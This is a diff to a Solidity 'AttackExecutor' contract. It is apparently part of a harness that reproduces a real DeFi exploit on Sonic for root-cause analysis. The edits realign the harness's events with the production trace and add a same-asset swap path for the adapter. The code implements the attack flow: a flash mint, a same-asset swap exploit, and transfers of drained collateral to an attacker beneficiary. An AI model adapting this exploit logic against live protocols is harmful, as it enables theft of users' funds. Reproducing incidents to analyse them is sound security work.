@@ -52,6 +52,9 @@ contract AttackExecutor is Ownable, IWithdrawHook {
 
     uint256 private constant BURST_ONE = 26_230_630_089;
     uint256 private constant BURST_TWO = 8_877_536_706;
+    // NOTE: Production Sonic attack returns 1 µ wstkscUSD as same-asset dust.
+    // Harness currently uses OUTPUT_DUST = 0 with dUSD output (different asset) as workaround
+    // to avoid adapter's same-asset underflow check. See Reproduce.md "Critical Deviation".
     uint256 private constant OUTPUT_DUST = 0;
     uint256 private constant FLASH_LOAN_PREMIUM_BPS = 5;
 
@@ -59,14 +62,17 @@ contract AttackExecutor is Ownable, IWithdrawHook {
     error UnauthorizedPool(address sender, address expected);
     error UnexpectedCollateral(address actual, address expected);
 
-    event FlashMintStart(uint256 amount);
-    event FlashMintSettled(uint256 amount);
+    // Events matching production Sonic trace for Tenderly comparison
+    event FlashMintStarted(address indexed executor, uint256 amount);
+    event FlashMintSettled(address indexed executor, uint256 repayAmount, uint256 premium);
+    event AttackerBurst(address indexed executor, address indexed recipient, uint256 amount, uint8 legIndex);
+
+    // Helper events for RCA analysis
     event DusdShuttled(address indexed helper, uint256 amount);
     event DusdFanOut(address indexed splitter, address indexed recipient, uint256 amount);
     event CollateralDustReturned(address indexed adapterAddress, uint256 amount);
     event FlashLoanRecorded(uint256 amount);
     event FlashLoanRepayment(address indexed adapterAddress, uint256 amount);
-    event AttackerBurst(uint8 indexed index, uint256 amount, address indexed recipient);
 
     constructor(
         TestMintableERC20 collateralToken_,
@@ -125,9 +131,6 @@ contract AttackExecutor is Ownable, IWithdrawHook {
             _startFlashMint();
         } else {
             flashMintActive = false;
-            if (OUTPUT_DUST > 0) {
-                dusdToken.mint(address(this), OUTPUT_DUST);
-            }
         }
 
         adapter.swapLiquidity(params, permitInput);
@@ -139,12 +142,7 @@ contract AttackExecutor is Ownable, IWithdrawHook {
             uint256 remaining = collateralErc20.balanceOf(address(this));
             if (remaining > 0) {
                 collateralErc20.safeTransfer(attackerBeneficiary, remaining);
-                emit AttackerBurst(0, remaining, attackerBeneficiary);
-            }
-
-            uint256 dusdBalance = dusdErc20.balanceOf(address(this));
-            if (dusdBalance > 0) {
-                dusdToken.burn(dusdBalance);
+                emit AttackerBurst(address(this), attackerBeneficiary, remaining, 0);
             }
         }
     }
@@ -157,8 +155,15 @@ contract AttackExecutor is Ownable, IWithdrawHook {
         if (msg.sender != router) {
             revert("UNAUTHORIZED_ROUTER");
         }
-        if (inputToken != address(collateralToken) || outputToken != address(dusdToken)) {
-            revert("UNEXPECTED_TOKENS");
+
+        // For same-asset swap (exploit path), input and output are both wstkscUSD
+        bool isSameAssetSwap = inputToken == outputToken;
+
+        if (!isSameAssetSwap) {
+            // Legacy path: different assets (not used in real exploit)
+            if (inputToken != address(collateralToken) || outputToken != address(dusdToken)) {
+                revert("UNEXPECTED_TOKENS");
+            }
         }
 
         emit FlashLoanRecorded(amountPulled);
@@ -167,8 +172,11 @@ contract AttackExecutor is Ownable, IWithdrawHook {
             collateralToken.burn(amountPulled);
         }
 
-        if (OUTPUT_DUST > 0) {
-            dusdErc20.safeTransfer(address(adapter), OUTPUT_DUST);
+        // Dust return for workaround case (dUSD output, different asset)
+        // Production Sonic attack returns 1 µ wstkscUSD (same-asset), but current harness uses
+        // OUTPUT_DUST = 0 with dUSD to avoid adapter's underflow check.
+        if (OUTPUT_DUST > 0 && !isSameAssetSwap) {
+            IERC20(outputToken).safeTransfer(address(adapter), OUTPUT_DUST);
             emit CollateralDustReturned(address(adapter), OUTPUT_DUST);
         }
     }
@@ -176,7 +184,7 @@ contract AttackExecutor is Ownable, IWithdrawHook {
     function _startFlashMint() internal {
         flashMintActive = true;
         dusdToken.mint(address(this), FLASH_MINT_AMOUNT);
-        emit FlashMintStart(FLASH_MINT_AMOUNT);
+        emit FlashMintStarted(address(this), FLASH_MINT_AMOUNT);
 
         _maybeTransferDusd(address(stagingVault), DUSD_STAGE_ONE);
         _pullFromRecycler(DUSD_RECYCLER_PULL_ONE);
@@ -190,7 +198,7 @@ contract AttackExecutor is Ownable, IWithdrawHook {
 
     function _finalizeFlashMint() internal {
         dusdToken.burn(FLASH_MINT_AMOUNT);
-        emit FlashMintSettled(FLASH_MINT_AMOUNT);
+        emit FlashMintSettled(address(this), FLASH_MINT_AMOUNT, flashLoanPremium);
         flashMintActive = false;
         flashLoanAmount = 0;
         flashLoanPremium = 0;
@@ -203,10 +211,10 @@ contract AttackExecutor is Ownable, IWithdrawHook {
         }
 
         collateralErc20.safeTransfer(attackerBeneficiary, BURST_ONE);
-        emit AttackerBurst(0, BURST_ONE, attackerBeneficiary);
+        emit AttackerBurst(address(this), attackerBeneficiary, BURST_ONE, 0);
 
         collateralErc20.safeTransfer(attackerBeneficiary, BURST_TWO);
-        emit AttackerBurst(1, BURST_TWO, attackerBeneficiary);
+        emit AttackerBurst(address(this), attackerBeneficiary, BURST_TWO, 1);
     }
 
     function onWithdraw(
